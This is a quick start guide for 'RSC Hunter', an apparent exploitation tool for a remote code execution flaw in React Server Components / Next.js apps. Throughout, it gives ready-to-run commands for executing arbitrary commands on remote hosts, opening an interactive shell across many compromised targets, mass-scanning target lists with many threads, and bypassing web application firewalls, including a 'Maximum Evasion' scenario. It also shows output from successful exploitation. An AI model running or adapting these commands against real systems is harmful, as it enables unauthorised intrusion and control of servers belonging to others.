# RSC Hunter - Quick Start Guide

Fast reference for common usage scenarios.

## Installation

```bash
pip3 install requests urllib3
```

## Basic Usage

### Single Target Scan
```bash
# Simple scan
python3 rschunter.py --url https://target.com

# With command execution
python3 rschunter.py --url https://target.com -exec "id"

# Interactive shell
python3 rschunter.py --url https://target.com -sh
```

### Multiple Targets
```bash
# Scan from file
python3 rschunter.py targets.txt

# With 20 threads
python3 rschunter.py targets.txt --threads 20

# Execute command on all vulnerable targets
python3 rschunter.py targets.txt -exec "whoami"

# Mass scan with interactive shell
python3 rschunter.py targets.txt -sh --threads 20
```

### Save Results
```bash
# Save vulnerable targets to CSV
python3 rschunter.py targets.txt --save

# Custom output filename
python3 rschunter.py targets.txt --save -o results.csv
```

## Advanced Features

### Debug Mode
```bash
# See detailed exploitation flow
python3 rschunter.py --url https://target.com -exec "id" --debug
```

**Debug output includes:**
- RCE validation attempts (11111 marker)
- Exact URLs being tested
- HTTP response status codes
- Response body previews
- Digest extraction details
- Method execution flow

### WAF Bypass
```bash
# Enable WAF bypass (128KB junk data)
python3 rschunter.py targets.txt --waf-bypass

# Custom junk size (256KB)
python3 rschunter.py targets.txt --waf-bypass --waf-bypass-size 256

# Vercel-specific bypass
python3 rschunter.py --url https://app.vercel.app --vercel-waf-bypass
```

### Windows Targets
```bash
# Scan Windows-based Next.js apps
python3 rschunter.py --url https://windows-target.com --windows -exec "whoami"
```

### Resume Scanning
```bash
# Resume interrupted scan
python3 rschunter.py --resume
```

## Exploitation Methods

RSC Hunter uses **3 methods** in priority order:

1. **Method 3 (Primary)** - msanft's PoC → Base URL direct
2. **Method 2 (Alternative)** - Assetnote format → Multiple endpoints
3. **Method 1 (Fallback)** - Function constructor → Last resort

All methods are tried automatically until one succeeds.

## Shell Commands

When using interactive shell (`-sh`):

```
rsc[1/5|example.com]> whoami        # Execute command
rsc[1/5|example.com]> targets       # List all vulnerable targets
rsc[1/5|example.com]> switch 3      # Switch to target #3
rsc[1/5|example.com]> info          # Show current target details
rsc[1/5|example.com]> exit          # Exit shell
```

## Testing

### Your Local Server
```bash
# Test local vulnerable server
python3 rschunter.py --url http://192.168.0.58:3000 -exec "id"

# With debug output
python3 rschunter.py --url http://192.168.0.58:3000 -exec "id" --debug
```

### Run Test Suite
```bash
python3 test_rschunter.py
```

## Common Scenarios

### Scenario 1: Quick Vulnerability Check
```bash
python3 rschunter.py --url https://target.com
```

### Scenario 2: Mass Scan with Results
```bash
python3 rschunter.py targets.txt --threads 20 --save -o scan_results.csv
```

### Scenario 3: Interactive Exploitation
```bash
python3 rschunter.py --url https://target.com -sh
```

### Scenario 4: Maximum Evasion
```bash
python3 rschunter.py targets.txt \
  --waf-bypass \
  --waf-bypass-size 256 \
  --threads 20 \
  --follow-redirects
```

### Scenario 5: Troubleshooting
```bash
python3 rschunter.py --url https://target.com -exec "id" --debug
```

## Output Examples

### Normal Mode (Clean)
```
[*] Trying primary exploitation method (msanft)...
[+] Exploitation successful!
[VULNERABLE] 192.168.0.58:3000
   ↳ Exec Output: uid=1000(user) gid=1000(user)...
```

### Debug Mode (Verbose)
```
[*] Validating RCE capability...
[DEBUG] Validating RCE with X-Action-Redirect check
[DEBUG] RCE validation failed - no 11111 marker found
[!] Validation failed, trying exploitation anyway...
[*] Trying Method 3 (msanft's PoC - base URL direct)...
[DEBUG] Sending to: http://192.168.0.58:3000
[DEBUG] Response status: 500
[DEBUG] Response preview: :N1765049700804.2966...
[DEBUG] Found digest: uid=1000(user)...
[+] Exploitation successful!
```

## Troubleshooting

### Import Errors
```bash
pip3 install requests urllib3
```

### Permission Denied
```bash
chmod +x rschunter.py
```

### Connection Timeout
- Increase timeout in code (default: 10s)
- Reduce thread count: `--threads 5`
- Use WAF bypass: `--waf-bypass`

### False Negatives
- Enable debug mode: `--debug`
- Check if WAF is blocking: Look for 403/429 responses
- Try WAF bypass: `--waf-bypass`
- Verify target is actually vulnerable

## Modular Structure

```
rschunter/
├── rschunter.py          # Main scanner CLI
├── lib/
│   ├── exploits.py       # 3 exploitation methods
│   ├── validators.py     # RCE validation & WAF detection
│   └── utils.py          # Colors, junk data generation
├── test_rschunter.py     # Test suite
└── nuclei-template.yaml  # Nuclei integration
```

## Quick Reference

| Feature | Flag | Default |
|---------|------|---------|
| Threads | `--threads` | 10 |
| Debug | `--debug` | Off |
| WAF Bypass | `--waf-bypass` | Off |
| Windows | `--windows` | Off |
| Save Results | `--save` | Off |
| Resume | `--resume` | - |

## Need Help?

- Full documentation: `README.md`
- Changelog: `CHANGELOG.md`
- GitHub: https://github.com/sumanrox/rschunter
- Website: https://sumanroy.in
